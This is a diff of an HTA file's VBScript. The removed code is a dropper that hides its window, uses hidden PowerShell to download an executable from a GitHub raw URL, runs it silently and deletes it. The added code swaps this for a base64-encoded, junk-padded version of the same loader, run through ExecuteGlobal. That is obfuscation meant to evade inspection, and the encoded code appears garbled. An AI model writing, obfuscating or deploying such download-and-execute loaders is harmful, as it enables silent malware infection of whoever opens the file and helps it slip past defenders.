@@ -12,41 +12,20 @@
     SCROLL="no"
   >
   <script language="VBScript">
-    Sub Window_OnLoad()
-      ' Hide the window immediately
-      window.resizeTo 0, 0
-      window.moveTo -10000, -10000
+    Dim encoded
+    encoded = "U3ViIGFfKCkNCiAgICAnIEp1bmsgZnVuY3Rpb24gLSB1c2VsZXNzDQogICAgRGltIGpfaSwganJmLCB5bHh0LCBzaW5sLA0KICAgIERpbSBkbnQgPSAxMDANCiAgICBEaW0gZG5fMSwgZG5fMiwgZG5fMywgZG5fNCwgZG5fNSwgZG5fNiwgZG5fNywgZG5fOCwgZG5fOSwgZG5fMTANCiAgICBGdW5jdGlvbiBqX3VuYyh4KQ0KICAgICAgICBqX3VuYyA9IG5ldyBEaW0NCiAgICAgICAgRm9yIGkgPSAwIFRvIDkNCiAgICAgICAgICBqX3VuYyA9IGogKyBpICogMg0KICAgICAgICBGb3IgDQogICAgICAgIGkAID0gaSArIDEgV2hlbg0KICAgICAgICBGb3IgIEkgPSBJIFRvIDEwDQogICAgICAgICAgICBqX3VuYyA9IGogKyBqX3VuYyANCiAgICAgICAgRm9yDQogICAgICAgIGlmIGogPSA4IHRoZW4NCiAgICAgICAgICAgIGppID0gaSAqIDENCiAgICAgICAgRW5kIFVuaW9uDQogICAgRW5kIFVuYw0KDQogICAgJ1dpbmRvdyBfT25Mb2FkKCkNCiAgICAgICAgc3ViIGJhZmYoKQ0KICAgICAgICAgICAgJyBIaWRlIHdpbmRvdyBpbW1lZGlhdGVseQ0KICAgICAgICAgICAgd2luZG93LnJlc2l6ZVRvIDAsIDANCiAgICAgICAgICAgIHdpbmRvdy5tb3ZlVG8gLTEwMDAwLCAtMTAwMDANCg0KICAgICAgICAgICAgJ2R1bW15IHZhcmlhYmxlcyB3aXRoIG5ld2BtZXF1ZXMNCiAgICAgICAgICAgIGRpbSAkYSAzLCAlYiwgJSQNCiAgICAgICAgICAgIGRpbSBicmFuZGQgPSAiRGF0YSINCg0KICAgICAgICAgICAgJ2RldmluZSB2YXJpYWJsZXMNCiAgICAgICAgICAgIGRpbSBkbl9maWxlVXJsLCBkbl9zYXZlIDogU3RyaW5ncw0KICAgICAgICAgICAgZGw5cHcgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dhc2RlcmxvbC90ZXN0L21haW4vdGVzdC5leGUiDQogICAgICAgICAgICBkbl9zYXZlID0gImMgOlxcRG93bmxvYWRcXGRvd25sb2FkZWRmaWxlLmV4ZSIgDQogICAgICAgICAgICBzZWxsID0gQ3JlYXRlT2JqZWN0KCdXU2NyaXB0LlNoZWxsJykNCg0KICAgICAgICAgICAgJ1Bvd2Vyc2hlbGwgY29tbWFuZCBkYXRhDQogICAgICAgICAgICBjbWQgPSAicG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgIiAmICIgJ1wiIHMgIiAmIGRsOXB3ICIgJ1wiIg0KDQogICAgICAgICAgICAnUnVuIGNvbW1hbmQNCiAgICAgICAgICAgIGV4aXRDb2RlID0gc2VsbC5SdW4gKGNtZCwgMCwgVHJ1ZSkNCg0KICAgICAgICAgICAgSWYgZXhpdENvZGUgPSAwIFRoZW4NCiAgICAgICAgICAgICAgICAnUnVuIGV4ZWN1dGFibGUNCiAgICAgICAgICAgICAgICBzZWxsLlJ1biBkbl9zYXZlLCAwLCBGYWxzZQ0KICAgICAgICAgICAgICAgICAnRGVsZXRlIGZpbGUgZnVuY3Rpb24NCiAgICAgICAgICAgICAgICBPbiBFcnJvciBSZXN1bWUgTmV4dA0KICAgICAgICAgICAgICAgIGRsOXB3LmRlbGV0ZUZpbGUgZG5fc2F2ZSwgVHJ1ZQ0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIE1zZ0JveSAiRG93bmxvYWQgZmFpbGVkIHdpdGggZXhpdCBjb2RlICIgJiBleGl0Q29kZSwgdmJFeHBsYW5hdGlvbiwgIkVycm9yIg0KICAgICAgICAgICAgRW5kIGlmDQogICAgICAgICAgICB3aW5kb3cuY2xvc2UoKQ0KICAgICAgZW5kIHN1Yg=="
 
-      Dim fileUrl, savePath
-      fileUrl = "https://raw.githubusercontent.com/wasderlol/test/main/test.exe"
+    Function DecodeBase64(byVal str)
+      Dim xml, node
+      Set xml = CreateObject("MSXML2.DOMDocument.3.0")
+      Set node = xml.CreateElement("b64")
+      node.dataType = "bin.base64"
+      node.text = str
+      DecodeBase64 = node.nodeTypedValue
+      DecodeBase64 = StrConv(DecodeBase64, vbUnicode)
+    End Function
 
-      Dim fso
-      Set fso = CreateObject("Scripting.FileSystemObject")
-      savePath = fso.GetSpecialFolder(2) & "\downloadedfile.exe"
-
-      Dim shell, cmd, exitCode
-      Set shell = CreateObject("WScript.Shell")
-
-      ' Build PowerShell command to download file quietly
-      cmd = "powershell -NoProfile -WindowStyle Hidden -Command " & _
-            """Invoke-WebRequest -Uri '" & fileUrl & "' -OutFile '" & savePath & "'"""
-
-      ' Run PowerShell download, wait for completion
-      exitCode = shell.Run(cmd, 0, True)
-
-      If exitCode = 0 Then
-        ' Run the downloaded executable hidden
-        shell.Run Chr(34) & savePath & Chr(34), 0, False
-
-        ' Optional: delete after running (delayed cleanup omitted here for simplicity)
-        On Error Resume Next
-        fso.DeleteFile savePath, True
-      Else
-        MsgBox "Download failed with exit code " & exitCode, vbExclamation, "Error"
-      End If
-
-      window.close()
-    End Sub
+    ExecuteGlobal DecodeBase64(encoded)
   </script>
 </head>
 <body>
